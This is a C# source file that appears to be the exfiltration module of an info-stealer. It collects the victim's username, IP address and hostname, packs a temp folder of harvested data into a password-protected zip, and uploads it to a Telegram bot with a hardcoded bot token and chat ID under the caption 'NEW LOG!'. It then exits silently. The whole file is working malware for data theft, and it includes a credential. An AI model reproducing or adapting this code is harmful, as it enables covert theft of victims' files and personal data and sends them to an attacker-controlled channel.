using Ionic.Zip;
using System;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Text;

namespace _s_AINT
{
    class cSendDate
    {
        public static string username = WindowsIdentity.GetCurrent().Name;

        static string host = Dns.GetHostName();
        static IPAddress IP = Dns.GetHostByName(host).AddressList[0];

        static string HWID = "";

        static string Token = "1187431520:AAFQYvNnyVyrD5UaHBIJDSHSH6K4etCOR6g";
        static string ID = "923725256";
        public static void Send()
        {
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
            {
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                zip.Comment = "" +
                    "\n<========================================>" +
                    "\nPC:" + username +
                    "\nIP: " + IP +
                    "\nHWID: " + HWID +
                    "\nGovnoCode by: Rass | @Dobriydensegodnasubota"
                    ;
                zip.Password = "DARK";
                zip.AddDirectory(@"" + Program.temp + username);
                zip.Save(@"" + Program.temp + "\\(s)ANINA.zip");
            }

            // а вот это уже отправка на тг!
            string LOG = @"" + Program.temp + "\\(s)ANINA.zip";

            byte[] file = File.ReadAllBytes(LOG);
            string url = string.Concat(new string[]
            {
                "https://api.telegram.org/bot",
                   Token,
                   "/sendDocument?chat_id=",
                   ID,
                   "&caption=NEW LOG! " +
                   "\nPC: " + username +
                   "\nIP: " + IP +
                   "\nPassword: DARK" +
                   "\n Coded by Rass"
            });
            UploadMultipart(file, LOG, "application/x-ms-dos-executable", url);
            return;
        }
        private static void UploadMultipart(byte[] file, string filename, string contentType, string url)
        {
            try
            {
                WebClient webClient = new WebClient();
                string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                string @string = webClient.Encoding.GetString(file);
                string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                {
                   text,
                   filename,
                   contentType,
                   @string
                });
                byte[] bytes = webClient.Encoding.GetBytes(s);
                webClient.UploadData(url, "POST", bytes);
                Environment.Exit(0);
            }
            catch { }
        }
    }
}
